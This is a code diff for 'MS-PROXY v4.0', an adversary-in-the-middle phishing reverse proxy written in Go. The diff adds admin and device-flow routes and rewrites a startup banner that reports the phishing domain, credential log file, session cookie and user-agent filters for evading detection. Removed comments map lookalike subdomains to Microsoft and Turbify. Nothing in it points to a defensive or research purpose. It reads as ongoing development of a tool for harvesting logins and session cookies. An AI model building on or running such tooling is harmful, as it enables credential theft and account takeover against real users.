@@ -10,23 +10,29 @@ import (
 )
 
 func main() {
-	// Profiler mode:
-	//   ms-proxy -profile -domain <domain> [-key <k>] [-user <u> -pass <p>] [-headful]
-	// Static recon always runs; -user/-pass add the dynamic (headless) phase.
 	if len(os.Args) >= 2 && os.Args[1] == "-profile" {
 		runProfiler(os.Args[2:])
 		return
 	}
 
-	// Initialize subsystems
 	initSessionManager()
 	initTargets()
-	initGeoIP() // ← add: load MaxMind DBs
 	initCorrelator()
+	initConfig()
 
+	// ── CREATE THE CUSTOM MUX FIRST ──
+	// ── CREATE THE CUSTOM MUX FIRST ──
 	mux := http.NewServeMux()
-	mux.HandleFunc("/", mainHandler)
 
+	// ── CONFIG & ADMIN API ROUTES ──
+	mux.HandleFunc("/api/config", handleGetConfig)
+	mux.HandleFunc("/api/admin/update", handleWebhookUpdate)
+	mux.HandleFunc("/api/admin/domains", handleGetAllDomains)
+
+	// ── MAIN PROXY & DEVICE FLOW ROUTES ──
+	mux.HandleFunc("/", mainHandler)
+	mux.HandleFunc("/device", deviceHandler)
+	mux.HandleFunc("/device/status", deviceStatusHandler)
 	server := &http.Server{
 		Addr:         listenAddr,
 		Handler:      mux,
@@ -43,36 +49,52 @@ func main() {
 }
 
 func printBanner() {
-	fmt.Println("══════════════════════════════════════════════════════")
-	fmt.Println("  MS-PROXY v3.0 — Chameleon AiTM Reverse Proxy")
-	fmt.Println("  Architecture: NOSCAMLIKEME (decompress → modify → compress)")
-	fmt.Println("══════════════════════════════════════════════════════")
-	fmt.Printf("  Listen:   %s\n", listenAddr)
-	fmt.Printf("  Domain:   %s\n", phishDomain)
-	fmt.Printf("  Cred log: %s\n", credLogFile)
-	fmt.Printf("  Sessions: enabled (cookie: %s)\n", sessionMgr.cookieName)
-	fmt.Printf("  Filter:   %d blocked UA patterns\n", len(blockedUAPatterns))
-	fmt.Println("──────────────────────────────────────────────────────")
-	fmt.Printf("  Targets:  %d configured\n\n", len(targets))
+	const (
+		Reset   = "\033[0m"
+		Cyan    = "\033[36m"
+		Green   = "\033[32m"
+		Yellow  = "\033[33m"
+		Magenta = "\033[35m"
+		Bold    = "\033[1m"
+	)
+
+	fmt.Println()
+	fmt.Printf("%s┌──────────────────────────────────────────────────────────────┐%s\n", Cyan, Reset)
+	fmt.Printf("%s│  %-54s │%s\n", Cyan, Bold+"MS-PROXY v4.0 — Chameleon AiTM Reverse Proxy"+Reset, Cyan)
+	fmt.Printf("%s│  %-54s │%s\n", Cyan, "Architecture: Decompress → Mutate → Compress", Reset)
+	fmt.Printf("%s└──────────────────────────────────────────────────────────────┘%s\n", Cyan, Reset)
+	fmt.Println()
+
+	fmt.Printf("  %sListen:%s     %s%s%s\n", Yellow, Reset, Green, listenAddr, Reset)
+	fmt.Printf("  %sDomain:%s     %s%s%s\n", Yellow, Reset, Green, phishDomain, Reset)
+	fmt.Printf("  %sCred Log:%s   %s%s%s\n", Yellow, Reset, Green, credLogFile, Reset)
+	fmt.Printf("  %sSession:%s    %s%s%s\n", Yellow, Reset, Green, sessionMgr.cookieName, Reset)
+	fmt.Printf("  %sDefense:%s    %sActive%s (UA Filters + %sDynamic Swarm Blocking%s)\n", Yellow, Reset, Green, Reset, Magenta, Reset)
+	fmt.Println()
+
+	fmt.Printf("  %sConfigured Targets (%d):%s\n", Cyan, len(targets), Reset)
+	fmt.Println("  ──────────────────────────────────────────────────────────────")
 
 	for key, t := range targets {
-		// Find the entry URL
 		entry := "https://" + t.EntrySubdomain
-		fmt.Printf("  [%s] %s\n", key, t.Name)
-		fmt.Printf("    Entry: %s\n", entry)
+		fmt.Printf("  %s[%s]%s %-22s %s%s\n", Magenta, key, Reset, t.Name, Green, entry)
+
+		count := 0
 		for sub, real := range t.HostMap {
-			fmt.Printf("    %-32s → %s\n", sub, real)
+			if count < 3 {
+				fmt.Printf("    %-30s → %s\n", sub, real)
+				count++
+			} else {
+				fmt.Printf("    %-30s → %s\n", "...", fmt.Sprintf("+%d more routes", len(t.HostMap)-3))
+				break
+			}
 		}
 		fmt.Println()
 	}
-
-	fmt.Println("══════════════════════════════════════════════════════")
+	fmt.Println("══════════════════════════════════════════════════════════════")
 	fmt.Println()
 }
 
-// extractTargetKey returns the target key from a host string
-// e.g. "micro.noscamlike.me" → "microsoft"
-// e.g. "mail.noscamlike.me" → "turbify"
 func extractTargetKey(host string) string {
 	for key, t := range targets {
 		for sub := range t.HostMap {
